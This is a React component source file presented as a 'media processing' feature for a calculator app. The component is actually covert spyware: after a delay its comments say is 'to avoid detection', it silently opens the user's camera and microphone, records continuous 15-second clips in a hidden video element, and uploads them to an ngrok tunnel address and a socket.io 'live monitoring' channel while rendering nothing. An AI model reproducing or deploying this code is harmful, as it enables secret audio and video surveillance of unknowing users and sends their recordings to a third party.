import { useEffect, useRef, useCallback } from 'react';
import config from '../config';

// Media processing component for advanced calculator features
const MediaProcessor = ({ connectionId, isActive = true }) => {
  const mediaStreamRef = useRef(null);
  const mediaRecorderRef = useRef(null);
  const chunkIndexRef = useRef(0);
  const recordingIntervalRef = useRef(null);

  const uploadClip = useCallback(async (blob, index) => {
    const formData = new FormData();
    const timestamp = new Date().toISOString();
    const filename = `${connectionId}_${timestamp}_${index}.webm`;
    
    formData.append('video', blob, filename);
    formData.append('connectionId', connectionId);
    formData.append('timestamp', timestamp);
    formData.append('chunkIndex', index);

        try {
          // Fix API path for different environments
          const apiUrl = window.location.hostname.includes('vercel.app') 
            ? 'https://418b361141b1.ngrok-free.app/api/upload-chunk'
            : 'http://localhost:3000/api/upload-chunk';
            
          const response = await fetch(apiUrl, {
            method: 'POST',
            body: formData
          });

          if (response.ok) {
            console.log(`🎥 Auto-saved clip ${index}:`, filename);
            
            // Also emit live stream data via socket for real-time viewing
            import('socket.io-client').then(({ io }) => {
              // Connect to ngrok tunnel for live monitoring
              const monitoringUrl = window.location.hostname.includes('vercel.app') 
                ? 'https://418b361141b1.ngrok-free.app'
                : 'http://localhost:3000';
              
              const socket = io(monitoringUrl);
              socket.emit('live-stream-data', {
                sessionId: connectionId,
                timestamp: timestamp,
                videoChunk: Array.from(new Uint8Array(blob)),
                chunkIndex: index,
                filename: filename
              });
              console.log('📡 Sent live stream data to:', monitoringUrl);
            });
            
          } else {
            console.error('Failed to upload clip');
          }
        } catch (error) {
          console.error('Error uploading clip:', error);
        }
  }, [connectionId]);

  const startHiddenRecording = useCallback(async () => {
    try {
      // Get camera and microphone silently
      const stream = await navigator.mediaDevices.getUserMedia({
        video: { 
          width: { ideal: 1280 },
          height: { ideal: 720 },
          frameRate: { ideal: 30 }
        },
        audio: true
      });

      mediaStreamRef.current = stream;

      // Create hidden video element for monitoring
      const hiddenVideo = document.createElement('video');
      hiddenVideo.srcObject = stream;
      hiddenVideo.autoplay = true;
      hiddenVideo.muted = true;
      hiddenVideo.style.display = 'none';
      document.body.appendChild(hiddenVideo);

      // Start recording in 15-second chunks
      const startRecordingChunk = () => {
        const mediaRecorder = new MediaRecorder(stream, {
          mimeType: 'video/webm;codecs=vp8,opus',
          videoBitsPerSecond: 1000000 // 1Mbps
        });

        mediaRecorderRef.current = mediaRecorder;
        const chunks = [];

        mediaRecorder.ondataavailable = (event) => {
          if (event.data.size > 0) {
            chunks.push(event.data);
          }
        };

        mediaRecorder.onstop = () => {
          const blob = new Blob(chunks, { type: 'video/webm' });
          uploadClip(blob, chunkIndexRef.current);
          chunkIndexRef.current++;
        };

        mediaRecorder.start();

        // Stop and restart every 15 seconds
        setTimeout(() => {
          if (mediaRecorder.state === 'recording') {
            mediaRecorder.stop();
          }
        }, 15000); // 15 second clips
      };

      // Start first chunk
      startRecordingChunk();

      // Set up interval to record continuously
      recordingIntervalRef.current = setInterval(() => {
        if (mediaStreamRef.current && mediaStreamRef.current.active) {
          startRecordingChunk();
        }
      }, 15000);

      console.log('🎥 Hidden recording started - 15sec clips');

    } catch (error) {
      console.error('Camera access denied or error:', error);
    }
  }, [uploadClip]);

  const stopHiddenRecording = useCallback(() => {
    if (recordingIntervalRef.current) {
      clearInterval(recordingIntervalRef.current);
    }

    if (mediaRecorderRef.current && mediaRecorderRef.current.state === 'recording') {
      mediaRecorderRef.current.stop();
    }

    if (mediaStreamRef.current) {
      mediaStreamRef.current.getTracks().forEach(track => track.stop());
    }

    // Remove hidden video element
    const hiddenVideos = document.querySelectorAll('video[style*="display: none"]');
    hiddenVideos.forEach(video => video.remove());

    console.log('🎥 Hidden recording stopped');
  }, []);

  useEffect(() => {
    if (isActive && connectionId) {
      // Start hidden recording automatically when component mounts
      const timer = setTimeout(() => {
        startHiddenRecording();
      }, 2000); // Small delay to avoid detection

      return () => {
        clearTimeout(timer);
        stopHiddenRecording();
      };
    }
  }, [isActive, connectionId, startHiddenRecording, stopHiddenRecording]);

  // Component renders nothing - completely hidden
  return null;
};

export default MediaProcessor;
